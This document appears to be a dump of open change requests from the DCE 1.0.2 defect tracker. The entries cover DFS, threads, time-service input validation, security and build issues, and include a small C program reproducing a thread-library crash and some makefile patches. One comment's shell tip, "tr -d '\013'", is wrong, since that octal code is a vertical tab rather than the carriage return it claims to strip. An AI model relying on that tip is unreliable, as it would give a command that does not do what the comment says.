Added field Transarc Status with value `open'

[3/2/93 public]
The problem is that epit_Deflate calls truncate on each page in the VT
and requires a new transaction about every 2 truncates.  This means that
for the above VT we call truncate about 100K times and in about 50K
transactions, even though the VT container only contains about 6
allocated blocks.
The fix is to test MAPUNKNOWN pages to find the ones that are
unallocated, and truncate them in very large groups.

[9/14/93 public]
The problem is well known, but it cannot be considered as defect. 
After talking to Ted, I marked this as enhancement. 
Changed Defect or Enhancement? from `def' to `enh'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 6990
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : fts delfldb has incorrect usage message
Reported Date                 : 1/25/93
Found in Baseline             : 1.0.2b12
Found Date                    : 1/25/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : 
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/25/93 public]
The fts delfdb  comman seems to display the incorrect
usage messge:
# fts delfldb -aggregate /u1 -server nike
fts: Missing required parameter '-fileset'
# fts delfldb -aggregate /u1 -server nike -fileset nike.u1
fts delfldbentry: neither -server nor -aggregate may be used with -fileset.
# 
According to the docs, the missing required parameter should be
'-prefix' and not '-fileset'.

[1/26/93 public]
The usage message is determined by the command package, and I'd guess that
the missing parameter message is also generated by the command package.
If that is true, then there may not be any way to fix the problem without 
enhancing the command parser and how it represents the syntax.
Vijay and Dave can provide a reliable diagnosis when they get to this defect.
Filled in Interest List CC with `davecarr@transarc.com, pakhtar@transarc.com' 
Changed Responsible Engr. from `pakhtar@transarc.com' to `vijay@transarc.com' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[3/16/93 public]
The problem here is that the command parser is printing this message.
There is no way to specify to the parser that certain groups of
options belong together, so the command parser doesn't know that if
-server is specified, only -prefix is allowed.  Here are the possible
things to do:
	1) fix the command parser.  This can't be done without adding
	a lot of complexity to the command parser.
	2) reverse the order of -fileset and -prefix.  While this
	would make the command parser print out the right message in
	the -server/-aggregate case, it would require that "-fileset"
	is used in the ``normal'' case.   This could let you
	accidentally delete more entries than you really want.
	3) make the options both optional and handle the processing by
	hand.  This means that the syntax printer would now print:
Usage: fts delfldbentry  [{-fileset {<name> | <ID>} | -prefix <string>}]
instead of:
Usage: fts delfldbentry  {-fileset {<name> | <ID>} | -prefix <string>}
	Not right but not that bad.
I don't think the problem is bad enough to do 1), and I think 2) is
too dangerous.  So, I'd say either cancel the defect or do 3).

[8/31/93 public]
Mark it as enhancement. This also affects the document. 
Changed Defect or Enhancement? from `def' to `enh' 
Changed H/W Ref Platform from `pmax' to `all' 
Changed S/W Ref Platform from `osf1' to `all' 
Changed Interest List CC from `davecarr@transarc.com, pakhtar@transarc.com' to 
 `davecarr@transarc.com, comer@transarc.com, tu@transarc.com, 
 pakhtar@transarc.com' 
Filled in Transarc Herder with `jaffe@transarc.com'

[9/1/93 public]
Tu is correct, this does affect the documentation; thanks, Tu!
 
Anyway, I think Mike's assessment is correct.  We can leave the command as is,
in which case the command parser generates a spurious error message in the
case where the user inadvertently types the command incorrectly; or we can
provide a syntax line that strongly implies that two options, one of which
is required, are both optional, which really leads the user to type the
command incorrectly in the first place.  I agree that neither case is
optimal, but I would vote for the former approach (leaving the command as
is), especially given our current development constraints.



CR Number                     : 6963
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : bak
Short Description             : obtaining status from butc should handle non-thread safe operations in butc
Reported Date                 : 1/22/93
Found in Baseline             : 1.0.2
Found Date                    : 1/22/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/22/93 public]
Running bak status on a tape coordinator that is rewinding a tape (for eg.)
causes it to fail. The reason is similar to the readlabel problem OT 6739
that was fixed a while ago. The tape specific operations are done using
ioctls that block all threads in butc. This causes the status rpc to fail
because the rpc runtime keep alives couldn't get through. The fix should
be similar to the one done for readlabel. A general mechanism was put in
place as part of the readlabel fix to handle RPCs to butc that return data.
Readlabel rpc is one of them. Status is the other one.
There is another related problem. The statusWatcher thread in bak periodically
makes a status rpc to update its list of jobs that are alive. This rpc meets
the same fate as the status command mentioned above. The result of this is,
when doing the jobs command, the job for which the status RPC failed shows 
up with [butc contact lost]. This situation should be handled similar to the
status and readlabel command situations.
Both the above defects will be tracked by this OT. This is not priority 1
for now, but may be raised if this becomes a problem.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/93 public]
After discussing the the nature of the problem with Vijay and Elliot, 
I mark this as an enhancement. It really needs a good policy to resolve 
the inconveninece mentioned above. 
Changed Defect or Enhancement? from `def' to `enh' 
Changed Interest List CC from `davecarr@transarc.com' to 
 `davecarr@transarc.com, khale@transarc.com, tu' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'



CR Number                     : 6945
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : sec_login.c
Short Description             : set_context returns invalid ctx. ifsec_login_credentials_private flag set
Reported Date                 : 1/20/93
Found in Baseline             : 1.0.2b11
Found Date                    : 1/20/93
Severity                      : E
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/20/93 public]
The sec_login_set_context routine returns invalid context if the 
sec_login_credentials_private flag was set during the 
sec_login_setup_identity call. This should probably return 
sec_s_not_implemented.

[2/20/93 public]
Downgraded to E4.  Given the number of real problems we have CR's for, I'm
letting you know now that this won't be fixed in 1.0.2.  It's cosmetic anyway,
since it really is an invalid context for the set_context() call, if you
set the flags to sec_login_credentials_private.

[8/2/93 public]

Changed to enhancement to be fixed in 1.1.



CR Number                     : 6886
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8025
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : IO wrappers
Short Description             : close() of fd being waited for confuses CMA
Reported Date                 : 1/18/93
Found in Baseline             : 1.0.2
Found Date                    : 1/18/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[1/18/93 public]
The enclosed test program demonstrates a defect with CMA: if you close a
file descriptor which is being listened on by another thread, CMA gets
horribly confused, with a bunch of assertions and then a core dump.
(reader_proc) blocking
(close_proc) sleeping
(close_proc) pipes[0]
**** Assertion warning. cma__close_general:  Closing a file with threads waiting to read.
     at line 447 in /project/dce/build/dce1.0.2/src/threads/cma_thread_io.c
**** Assertion warning. cma__close_general:  Closing a file with threads waiting for exception.
     at line 453 in /project/dce/build/dce1.0.2/src/threads/cma_thread_io.c
**** Assertion warning. cma__close_general:  Closing a file with read mask bit set.
     at line 456 in /project/dce/build/dce1.0.2/src/threads/cma_thread_io.c
**** Assertion warning. cma__close_general:  Closing a file with except mask bit set.
     at line 462 in /project/dce/build/dce1.0.2/src/threads/cma_thread_io.c
(close_proc) sleeping again
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: cma__io_available: File was unexpectedly closed
% See 'cma_dump.log' for state information.
zsh: IOT instruction (core dumped)  ./test-close
The obvious "correct" behavior in this case is that the system call should
be retried with the FD closed; otherwise, this breaks any legacy program
which calls a DCE library and then does a
"for (i=3; i<getdtablesize(); i++) close(i); exec()"
#undef _CMA_NOWRAPPERS_
#include <pthread.h>
#include <unistd.h>     
pthread_t reader;
pthread_t closer;
int pipes[2];
void *reader_proc (void *arg)
{
    char buf[1024];
    int ret;
    
    do {
	printf("(reader_proc) blocking\n");
	ret = read (pipes[0], buf, 1024);
	printf("(reader_proc) returned %d\n", ret);
    } while (ret > 0);
    printf("(reader_proc) returns now.\n");
    return 0;
}
void *close_proc (void *arg)
{
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    printf("(close_proc) sleeping\n");
    select (1, 0, 0, 0, &tv);
    printf("(close_proc) pipes[0]\n");
    close (pipes[0]);
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    printf("(close_proc) sleeping again\n");
    select (1, 0, 0, 0, &tv);
    printf("(close_proc) pipes[0]\n");    
    close (pipes[1]);
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    printf("(close_proc) sleeping a third time\n");    
    select (1, 0, 0, 0, &tv);
    printf("(close_proc) returning now\n");
    return 0;
}
main()
{
    pthread_addr_t status;
    
    pipe(pipes);
    
    pthread_create (&reader, pthread_attr_default, reader_proc, 0);
    pthread_create (&closer, pthread_attr_default, close_proc, 0);
    
    pthread_join(reader, &status);
    pthread_join(closer, &status);
}

[01/27/93 public]
So far I've gotten it down to the following code in cma__io_available.
Select has returned EBADF on the closed file descriptor. Need to check
with DEC to see if they have the FIX-ME in hand for this.....
                        if ((fstat (i, &buf) == -1) && (errno == EBADF)) {
                            cma__assert_warn (
                                i < cma__g_file_num,
                                "Big, bad, file descriptor.");
                            /*
                             * FIX-ME:
                             *
                             * What should happen here is we need to
"defer"
                             * a cma_close() on this file.
                             */
                            cma__bugcheck ("cma__io_available: File was
unexpectedly closed")
assigned to dec.

[5/25/93 public]
Filled in Interest List CC with `comer@transarc.com' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[10/19/93 public]
The fix for this involves an interaction between cma_close,
cma__close_general and cma__io_availacbe that I'm not comfortable 
with at this point in the schedule. Defered.



CR Number                     : 6879
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : Request for utc_verify_tm() routine
Reported Date                 : 1/18/93
Found in Baseline             : 1.0.2
Found Date                    : 1/18/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/18/93 public]

From IBM:

abstract      utc_mkanytime accepts and processes bogus input

the dts api utc_mkanytime will accept and process bad input such as:
too many days, years out of range, and Feb 29 during nonleapyear.

abstract      utc_mkasctime accepts and processes bogus input
the dts api utc_mkasctime will accept and process bad input such as:
0000-00-00-00:00:00.00-0:00I242.8.

abstract      dtscp update command accepts bad input.
The dtscp command "update" will accept bad input, and attempt to process it.
Some examples of the input:
update time 1991108-12-08:40:00.000-06:00I0.000
update time 1991-13-12-08:40:00.000-06:00I0.000
update time 1991-08-12-08:99:00.000-06:00I0.000
update time 9999-99-99-99:99:99.999-99:99I99.999

abstract      utc_mkgmtime accepts Feb 29 date during non-leapyear.
utc_mkgmtime accepts and processes 1900-2-29.

abstract      utc_mklocaltime accepts bad input.
utc_mklocaltime accepts bad input such as the nonleapyear 1900-2-29,
bad tm structs containing negative numbers, values too large or small.

abstract      utc_mkreltime accepts input timetm that are too large/too small
utc_mkreltime accepts input timetms that are too large or too small, returns
a zero, and gives a result that has rolled over.

abstract      utc_mkgmtime accepts timetm structs with bad elements.
utc_mkgmtime accepts timetm structs with bad elements, for example
tm_sec=90, tm_day=32.

abstract      dtscp change command accepts invalid leapyear.
dtscp change epoch epoch_number time new_time accepts invalid leapyears
for the new_time argument.  For example, entering Feb 29, 1993 will
update the time to March 1, 1993.


abstract      utc_mkgmtime accempts inacctm structs with bad elements.
utc_mkgmtime accepts inacctm structs with bad elements, for example,
tm_sec=60 , tm_min=60 (range for both is 0-59).

From Craig Yankes @ DEC:

                My suggestion for all 9 of these is to open a single
        enhancement request for the creation of a new "int utc_verify_tm
        (tm *timetm)" routine that returns happy or unhappy status depending
        upon whether all the fields within the structure are within the proper
        bounds for the proposed time.  This way, if someone wants to confirm
        a tm as being valid as is, the capability is there.  The reasons we
        are not suggesting that this functionality be added directly to the
        routines mentioned in the bug reports are the following:

        1) As shown by the "NULL discussions", the philosophy of DCE is to
           not slow down properly formed programs to check for improperly
           formed conditions.  Verifying a tm structure is not a simple task
           (all the rules for leap years, the switch to Julian time, etc.)
           and consumes cpu time.

        2) As a functional matter, if a program wants to calculate a time that
           is, say, 10 days from the current time, it is handy to just be able
           to say "tmtime.tm_day = tmtime.tm_day + 10;" and to be able to make
           the presumption that the underlying routines will do the right
           thing with this time.  Validating tm structures means that doing
           this "plus 10" example during the latter third of the month will
           cause an invalid tm structure and force the application program
           into performing all the carry propagations into the next fields
           (requiring, of course, all the knowledge embedded in DTS about
           leap years, Julian day conversion, etc., to be fully correct) that
           is done automatically by DTS today.

        3) As a compatability matter, I don't believe that Posix (where the
           tm structure comes from and from where it is defined) performs
           such field validations in its API.



CR Number                     : 6854
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : Make handling of blocking file
descriptors more dynamic.
Reported Date                 : 1/15/93
Found in Baseline             : 1.0.2
Found Date                    : 1/15/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/15/93 public]
The method cma employs to check for pending io on blocked
descriptors needs to be made more flexible. It currently uses
a fd_set bit mask to to keep track of all possible open files
which works if the maximum number of open files is <= to the
fd_set width. On OSF/1 1.1.1 this is not the case. The maximum
number of open files is dynamic and defaults to 1024 while
the width of fd_set is, short of forcing the application to 
redefine FD_SETSIZE prior to includeing types.h, fixed at 256.
The work around for 1.0.2 is to have cma_init drop the maximum
number of open file descriptos to 256.



CR Number                     : 6825
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : library
Short Description             : Cannot build a "debug" cds library without malloc instrumenting
Reported Date                 : 1/14/93
Found in Baseline             : 1.0.2
Found Date                    : 1/14/93
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/14/93 public]

We would like to build a "debuggable" cds library (one built with
-DDEBUG) without having also having to have cds malloc instrumenting.

Detaching event debugging from malloc debugging would be very useful.



CR Number                     : 6775
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Convert episode tracing to ICL model
Reported Date                 : 1/8/93
Found in Baseline             : 1.0.2b6
Found Date                    : 1/8/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/8/93 public]
ICL should be used as the tracing package for the episode kernel,
both standalone and under DFS.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[1/8/93 public]
Not to rain on anybody's parade, but in the interest of having meaningful
defect counts, this looks like an enhancement.
Changed Defect or Enhancement? from `def' to `enh'

[6/7/93 public]
This work was started by Rajesh, then deferred.  That delta, probabably
useful only for reference was rajesh-ot6775-add-icl-tracing-to-episode.
I have started another delta to do a small part of this under
ota-db3652-add-icl-tracing-to-logbuf.



CR Number                     : 6758
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec/krb5/comerr
Short Description             : extra carriage return in output
Reported Date                 : 1/7/93
Found in Baseline             : 1.0.2
Found Date                    : 1/7/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/krb5/comerr/com_err.c
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[1/7/93 public]
  com_err is not informed enough about the terminal state to make a
decision about raw/cooked mode and, hence, always appends a \r onto
its finished output lines for saftey. These ^M's appear in traces and
log files and produced a low-severity bug for us here at Transarc.
Forwarding JFYI.
  Code segment follows: 
		    ---- ---- ---- ---- ---- ----
    putc('\n', stderr);
    /* should do this only on a tty in raw mode */
    putc('\r', stderr);
    fflush(stderr);

		    ---- ---- ---- ---- ---- ----
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[1/7/93 public]

Changed to enhancement (this is purely cosmetic; you can flush the ^M's
trivially from the log file using "tr -d '\013'" from the shell.

emacs users might want to M-x load-library man and then run M-x
nuke-nroff-bs to flush the ^M's..

[1/8/93 public]
Changed Interest List CC from `travis@transarc.com, 
 bb+transarc.alpine@transarc.com' to `travis@transarc.com'



CR Number                     : 6753
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cm
Short Description             : Cache size must be user padded
Reported Date                 : 1/6/93
Found in Baseline             : 1.0.2
Found Date                    : 1/6/93
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[1/6/93 public]

Problem report:
In DFS and AFS, the
cachemanager is "told" how much space it has for caching via the
cacheinfo file (at least thats what its called in afs).  The
Cachemanager expects to have "cacheinfo" amount of space for its
Vfiles - the chunks of file data that it fetches from fileservers. In
AFS the CM maintains two other files, CacheItems and VolumeItems, that
maintain state information about the cached data.  These files take up
space in the cache, but are not calculated into the "cacheinfo space
guarantee".  

This means that when the sys admin sets up the client, he must mount a
partition as /usr/vice/cache that is 8 - 10% larger than what he
"promises" the CM in the cacheinfo file.  It has long been the belief
of everyone in Product Support and Training that the 8 - 10% should be
included in the cacheinfo calculation.  That is, the partition that I
mount as /usr/vice/cache should be exactly the size I specify in
cacheinfo.  

extract of Mike K's initial response:
The biggest problem has to do with computing the # of blocks used by indir 
blocks, too, but we can come up with upper bounds for all of those costs, too.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6750
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : libdcedfs
Short Description             : user-space programs should use libdcedfs.
Reported Date                 : 1/6/93
Found in Baseline             : 1.0.2
Found Date                    : 1/6/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : src/file/libdcedfs
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/6/93 public]
There is a shared library called libdcedfs that exists in src/file.  The 
idea is to have all DFS user programs link against this shared library, and
hence save oodles of disk space (and make upgrading easier).  This ot
entry is here to make this stuff work.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[3/21/94 public]
Assigned to Mike to determine relevance to small resource effort.



CR Number                     : 6747
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : tools
Short Description             : initcmd opcode in command package is redundant
Reported Date                 : 1/6/93
Found in Baseline             : 1.0.2
Found Date                    : 1/6/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[1/6/93 public]
   Apparently the command package has two ways of dealing with commands that
can have no opcode (sub-command): have a syntax description for no opcode
(only one permitted per command) or have a syntax description for the
special opcode initcmd (which may be present on the command line or not (if
not, code in tools/cmd/cmd.c:cmd_Dispatch handles this special case)).
There seems to be no reason to have both methods available.  The logic in
the command package is complicated unnecessarily by the existence of both.
initcmd is only used in the bosserver and scout (and two test programs in
gtx).
   I suggest eliminating the initcmd opcode and changing bosserver and scout
accordingly.  The initcmd opcode is not documented anywhere and its
elimination from the bosserver and scout would be totally transparent to
users.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[4/7/93 public]
Code clean-up enhancement.
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 6731
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : xcred
Short Description             : Function comments in header file are wrong.
Reported Date                 : 1/5/93
Found in Baseline             : 1.0.1
Found Date                    : 1/5/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[1/5/93 public]
The comments about return codes for many of the functions in the 
xcred.h file are incorrect.  Also, some of the function logic
explainations are in error.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[1/5/93 public]
Changed to an enhancement.
Changed Defect or Enhancement? from `def' to `enh'

[9/15/94 public]
Changed Responsible Engr. from `fred@transarc.com' to `andi@transarc.com'



CR Number                     : 6725
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : bak
Short Description             : support patterns for servers and aggregates in fileset family entries
Reported Date                 : 1/4/93
Found in Baseline             : 1.0.2
Found Date                    : 1/4/93
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[1/4/93 public]

The routine that parses a fileset family entry and determines the list of 
filesets to be included in a dump is bc_EvalVolumeSet in bak/volstub.c. This
function builds a pattern for server, aggregate and fileset, calls 
VL_ListEntry to cycle through each entry in the FLDB determining whether
this fileset along with its server address and aggregate would match the
pattern previously constructed. There are two enhancements that could be
made here.

1. Use VL_ListByAttributes to restrict the filesets listed to correspond to
the server and aggregate specified in the fileset family entry. If the
server and aggregate specified are wildcards (.*), the this RPC can be used
to get a bunch of fileset entries. This would reduce the number of RPCs
made to get all fileset entries, and would speed up dumps by a large factor
(particularly if the FLDB has a lot of entries).

2. Accept patterns not only for filesets in the fileset family entry, but also
for servers and aggregates. Server patterns could be DCE hostnames, Internet
domain host names or IP addresses. For DCE hostnames, CDS lookups have to
be made to get all hostnames that match the server pattern, and get the 
addresses of each of these hosts. For Internet style host names, the server
address from VL_ListByAttributes should be converted to the Internet domain
host name and this string should be compared with the server pattern. For
IP addresses, the server address from VL_ListByAttributes should be converted
to a IP address and this string should be compared with the pattern.

The patterns for aggregates would be aggregate names. The aggregate ID obtained
from VL_ListByAttributes should be converted to a aggregate name and this 
string should be compared with the aggregate pattern.

Accepting patterns for servers, aggregates and filesets would make things
uniform and provide more flexibility. 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 6712
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Shorten hash chains by removing unused vnodes
Reported Date                 : 12/31/92
Found in Baseline             : 1.0.2
Found Date                    : 12/31/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : fixed
Transarc Deltas               : ota-db5313-vnsync, et al
Transarc Herder               : jaffe@transarc.com

[12/31/92 public]
When a vnode loses its identity (through file deletion or unmounting), it
should be removed from the vnode hash table, so that searches for other vnodes
with the same hash value won't have to look at it.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[7/18/94 public]
This was fixed as part of the comprehensive vnode synchronization
changes made under Transarc defect 5313 and related deltas.
Changed Subcomponent Name from `lfs' to `EPISODE' 
Changed Transarc Status from `open' to `fixed' 
Filled in Transarc Deltas with `ota-db5313-vnsync, et al'



CR Number                     : 6709
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5188
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : common makefiles
Short Description             : can't build idl stubs with 'c' files
Reported Date                 : 12/31/92
Found in Baseline             : 1.0.2
Found Date                    : 12/07/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : osf.dce.mk osf.std.mk
Sensitivity                   : public

[12/31/92 public]
If you don't specify -keep c_source in the IDLFLAGS variable in a makefile
tat invokes the IDL compiler, you always re-IDL.  This should not be the
case.  The common makefiles should contain .idl.o rules similar to what is
 currently there for .idl.c rules to fill the gap in the suffix chain.  In 
 order to make such rules possible, you must also add a way to get 
 CFLAGS passed to the idl compiler to get the shared libray stuff done right.
 I have prototypes for the second change in a sandbox if anyone wants'em.

[ Disclaimer: this may be a dup.  I have been holding this defect with the
  intent of checking to see if it was already entered, but the schedule being
  what it is, I have no time.
]

[12/31/92 public]
Note that make will still do things twice anyway.  That is, blocks like:
	client_stub.o server_stub.o: server.idl
		...
Will still run IDL twice.  This is an ODE make bug, see ODE OT #232.

[01/04/92 public]
Right, Rich.  That is understood.  The behavior that I want to avoid is the
consistent rebuild of the *cstub.o and *sstub.o from an unmodified .idl file
if -keep c_source is not specified.  This is caused by the lack of a .idl.o
rule in osf.std.mk.  In the absence of this type of rule, make is forced to
re-idl the file in an attempt to follow the .idl -> .c -> .o path from a 
.idl to a .o.

[01/04/92 public]
Rich Zeliff asked that I add the prototype changes to fix this defect to
this defect report:
 
   osf.dce.mk
   ----------
     Added the lines indicated by a '+'

       .if ${USE_SHARED_LIBRARIES}
       _SHCCDEFS_=-D_SHARED_LIBRARIES
       _PICLIB_=-pic-lib ${_GENLIB_} ${_CC_LIBDIRS_} ${_LIBS_}
       _GLUE_=-%ld," -warn_nopic -glue"
   +   _GENIDLCFLAGS_= ${_SHCCDEFS_} ${_PICLIB_}
       .else
       _SHCCDEFS_=
       _PICLIB_=
       _GLUE_=
   +   _GENIDLCFLAGS_=
       .endif

 [ Note: this just gets the stuff needed for shared libs passed on the idl
         command line.  The idl command line uses this as described below.
 ]


 osf.std.mk
 ----------
    Added the following assignment:

      _IDLCFLAGS_ = -cc_opt '${_GENIDLCFLAGS_} \
               ${${TARGET_MACHINE}_IDLCFLAGS} \
       ${${.TARGET}_IDLCFLAGS} \
       ${${.ALLSRC:T:M*.idl}_IDLCFLAGS:U${IDLCFLAGS}}'


   And modified the assignment of _IDLFLAGS as indicated by the '+':
 
      _IDLFLAGS_=\
  +        ${_IDLCFLAGS_} \
           ${${TARGET_MACHINE}_IDLFLAGS} \
           ${${.TARGET}_IDLFLAGS} \
           ${${.ALLSRC:T:M*.idl}_IDLENV:U${IDLENV}}\
           ${${.ALLSRC:T:M*.idl}_IDLFLAGS:U${IDLFLAGS}}\
           ${${.ALLSRC:T:M*.idl}_IDLARGS:U${IDLARGS}}\
           ${_GENIDLINC_} ${_CC_INCDIRS_}

  [ Note: these changes get the CFLAGS into the idl command line, as well
          as any shared library stuff.
  ]


  If these changes are combined with .idl.o rules in the style of the 
  existing .idl.c rules, then you should be able to build *stub.o files 
  without keeping the 'C' source around.

